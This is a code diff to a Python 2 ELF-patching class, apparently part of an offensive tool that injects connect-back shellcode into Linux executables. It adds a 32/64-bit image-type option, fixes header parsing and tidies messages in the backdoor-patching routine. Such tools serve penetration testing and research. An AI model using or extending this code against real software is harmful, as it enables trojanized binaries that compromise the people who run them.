@@ -88,7 +88,7 @@ class elfbin():
     """
     def __init__(self, FILE, OUTPUT, SHELL, HOST="127.0.0.1", PORT=8888, 
                  SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
-                 SUPPLIED_SHELLCODE=None):
+                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE="ALL"):
         #print FILE
         self.FILE = FILE
         self.OUTPUT = OUTPUT
@@ -100,6 +100,7 @@ class elfbin():
         self.SUPPORT_CHECK = SUPPORT_CHECK
         self.SHELL_LEN = SHELL_LEN
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
+        self.IMAGE_TYPE = IMAGE_TYPE
         self.supported_types = {
                                 0x00:   #System V 
                                 [[0x01, #32bit
@@ -148,6 +149,7 @@ class elfbin():
                 self.print_supported_types()
             else:
                 print "%s is supported." % self.FILE
+                
             sys.exit(-1)
         
        
@@ -226,8 +228,10 @@ class elfbin():
         This function sets the shellcode.
         """
         print "[*] Setting selected shellcode"
+        #x32
         if self.EI_CLASS == 0x1 and self.e_machine == 0x03:
             self.bintype = linux_elfI32_shellcode
+        #x64
         if self.EI_CLASS == 0x2 and self.e_machine == 0x3E:
             self.bintype = linux_elfI64_shellcode
         if not self.SHELL:
@@ -293,22 +297,29 @@ class elfbin():
         print "[*] Checking file support" 
         self.bin_file.seek(0)
         if self.bin_file.read(4) == elf.e_ident["EI_MAG"]:
-            self.bin_file.seek(5,1)
-            sys_type = struct.unpack(">H", self.bin_file.read(2))[0]
+            self.bin_file.seek(4, 0)
+            class_type = struct.unpack("<B", self.bin_file.read(1))[0]
+
+            self.bin_file.seek(7,0)
+            sys_type = struct.unpack("<B", self.bin_file.read(1))[0]
             self.supported = False
             for system_type in self.supported_types.iteritems():    
                 if sys_type == system_type[0]:
                     print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
-                    self.supported = True
+                    if class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32'):
+                        self.supported = True
+                    elif class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
+                        self.supported = True
                     break
+
         else:
             self.supported = False
 
             
     def get_section_name(self, section_offset):
-        '''
+        """
         Get section names
-        '''
+        """
         self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset']+section_offset,0)
         name = ''
         j = ''
@@ -319,15 +330,16 @@ class elfbin():
             else:
                 name += j
         #print "name:", name
-
+        return name
     
+
     def set_section_name(self):
-        '''
+        """
         Set the section names
-        '''
+        """
         #print "self.s_shstrndx", self.e_shstrndx
          #how to find name section specifically
-        for i in range(0, self.e_shstrndx+1):
+        for i in range(0, self.e_shstrndx + 1):
             self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
             if self.sec_hdr[i]['name'] == ".text":
                 #print "Found text section"
@@ -350,11 +362,11 @@ class elfbin():
         else:
             #big self.endian
             self.endian = ">"
-        self.EI_VERSION = bin.read(1)
-        self.EI_OSABI = bin.read(1)
-        self.EI_ABIVERSION = bin.read(1)
-        self.EI_PAD = struct.unpack("<BBBBBBB", bin.read(7))[0]
-        self.e_type = struct.unpack("<H", bin.read(2))[0]
+        self.EI_VERSION = struct.unpack('<B', bin.read(1))[0]
+        self.EI_OSABI = struct.unpack('<B', bin.read(1))[0]
+        self.EI_ABIVERSION = struct.unpack('<B', bin.read(1))[0]
+        self.EI_PAD = struct.unpack(self.endian + "BBBBBBB", bin.read(7))[0]
+        self.e_type = struct.unpack(self.endian + "H", bin.read(2))[0]
         self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
         self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
         #print "EI_Class", self.EI_CLASS
@@ -455,7 +467,7 @@ class elfbin():
         #bin.seek(self.sec_hdr'][self.e_shstrndx']]['sh_offset'], 0)
         self.set_section_name()
         if self.e_type != 0x2:
-            print "[!] Only supporting executable elf e_types, things may get wierd."
+            print "[!] Only supporting executable elf e_types, things may get weird."
     
     
     def output_options(self):
@@ -465,6 +477,7 @@ class elfbin():
         if not self.OUTPUT:
             self.OUTPUT = os.path.basename(self.FILE)
 
+    
     def patch_elf(self):
         '''
         Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
@@ -502,7 +515,6 @@ class elfbin():
 
         self.gather_file_info()
         self.set_shells()
-        print "[*] Patching Binary"
         self.bin_file = open(self.backdoorfile, "r+b")
         
         shellcode = self.shellcode
@@ -547,6 +559,7 @@ class elfbin():
         if self.EI_CLASS == 0x01:
             #32 bit FILE
             #update section header table
+            print "[*] Patching x32 Binary"
             self.bin_file.seek(24, 0)
             self.bin_file.seek(8, 1)
             self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
@@ -593,6 +606,7 @@ class elfbin():
            
         else:
             #64 bit FILE
+            print "[*] Patching x64 Binary"
             self.bin_file.seek(24, 0)
             self.bin_file.seek(16, 1)
             self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
